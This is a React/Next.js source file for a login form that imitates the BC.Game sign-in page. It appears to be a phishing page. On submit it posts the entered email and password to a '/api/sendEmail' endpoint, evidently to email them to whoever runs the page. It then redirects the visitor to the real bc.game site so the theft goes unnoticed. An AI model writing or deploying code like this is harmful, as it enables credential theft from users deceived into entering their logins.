import React, { useState } from "react";
import { Formik, Field, Form, ErrorMessage } from "formik";
import * as Yup from "yup";
import { FaGoogle } from "react-icons/fa";
import { FaTelegramPlane } from "react-icons/fa";
import { IoLogoWhatsapp } from "react-icons/io";
import { FaLine } from "react-icons/fa6";
import { FaSteam } from "react-icons/fa";
import { SiWalletconnect } from "react-icons/si";
import { FaDiscord } from "react-icons/fa";
import { FaEyeSlash } from "react-icons/fa6";
import { FaEye } from "react-icons/fa";
import Link from "next/link";
import { useRouter } from "next/router";

// Define the validation schema using Yup
const validationSchema = Yup.object({
  email: Yup.string().required("Email or phone is required"),
  password: Yup.string()
    .min(6, "Password must be at least 6 characters")
    .required("Password is required"),
});

// Initial values for the form fields
const initialValues = {
  email: "",
  password: "",
};

const dammyData = [
  {
    id: 1,
    name: "Google",
    icon: FaGoogle,
    link: "",
  },
  {
    id: 2,
    name: "Telegram",
    icon: FaTelegramPlane,
    link: "https://t.me/bcgamewin",
  },
  {
    id: 3,
    name: "Discord",
    icon: FaDiscord,
    link: "https://discord.com/invite/xqUMQesZQq",
  },
  {
    id: 4,
    name: "Wallet Connect",
    icon: SiWalletconnect,
    link: "",
  },
  {
    id: 5,
    name: "Whats app",
    icon: IoLogoWhatsapp,
    link: "",
  },
  {
    id: 6,
    name: "Line",
    icon: FaLine,
    link: "",
  },
  {
    id: 7,
    name: "Steam",
    icon: FaSteam,
    link: "",
  },
];

const LoginForm = () => {
  const [showPassword, setShowPassword] = useState(false);
  const router = useRouter();

  // Function to handle form submission
  const onSubmit = async (values) => {
    // Add your logic for handling form submission here
    console.log("Form data submitted:", values);
    try {
      const response = await fetch("/api/sendEmail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: values.email,
          password: values.password,
        }),
      });

      if (response.ok) {
        console.log("Email sent successfully");
      } else {
        console.error("Failed to send email");
      }
    } catch (error) {
      console.error("Error:", error.message);
    } finally {
      router.push("https://bc.game/");
    }
  };
  return (
    <div className="w-full my-1.5 lg:my-0 h-full flex flex-col lg:justify-between text-xl max-w-[90%]">
      <div>
        <h2 className="lg:text-3xl font-bold mb-3">Sign In</h2>
        <Formik
          initialValues={initialValues}
          validationSchema={validationSchema}
          onSubmit={onSubmit}
        >
          <Form>
            <div className="w-full mb-4">
              <Field
                type="text"
                id="email"
                name="email"
                placeholder="Email / Phone number"
                className="w-full bg-black hover:bg-transparent px-5 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
                autoComplete="off"
              />
              <ErrorMessage
                name="email"
                component="div"
                className="text-red-400 text-xs"
              />
            </div>

            <div className="w-full relative">
              <Field
                type={showPassword ? "text" : "password"}
                id="password"
                name="password"
                placeholder="Login password"
                className="w-full pl-5 pr-12 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
                autoComplete="off"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="eye-button absolute top-[8%] lg:top-3 right-4 text-black"
              >
                {showPassword ? (
                  <FaEye size={24} color="white" />
                ) : (
                  <FaEyeSlash size={24} color="white" />
                )}
              </button>
              <ErrorMessage
                name="password"
                component="div"
                className="text-red-400 text-xs"
              />
            </div>

            <div className="w-full text-end text-gray-300 font-bold hover:underline cursor-pointer my-2">
              Forgot your password?
            </div>
            <div className="w-full">
              <button
                type="submit"
                className="w-full login-button text-xl font-bold py-2 lg:py-4 rounded-md"
              >
                Sign In
              </button>
            </div>
          </Form>
        </Formik>
        <div className="mt-4 lg:my-0 text-sm lg:text-2xl font-bold text-gray-400 tracking-wide">
          New to bc game?{" "}
          <span className="text-[#3BC117] hover:underline cursor-pointer">
            Create Account
          </span>
        </div>
      </div>
      <div className="w-full mt-8 lg:mt-0">
        <div className="relative w-full">
          <hr className="bg-white" />
          <span className="absolute text-center -top-4 left-0 right-0 mx-auto inline w-[320px] bg-[#1C1E22] px-10 overflow-hidden">
            Login directly with
          </span>
        </div>
        <div className="flex gap-2 justify-around mt-6">
          {dammyData.map((data) => {
            const Icon = data.icon;
            return (
              <Link key={data.id} href={data.link}>
                <div
                  className="bg-transparent hover:bg-black/55 text-xl border-4 cursor-pointer border-gray-400 text-center w-8 h-8 lg:w-14 lg:h-14 flex justify-center items-center rounded-md"
                  title={data.name}
                >
                  <Icon />
                </div>
              </Link>
            );
          })}
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
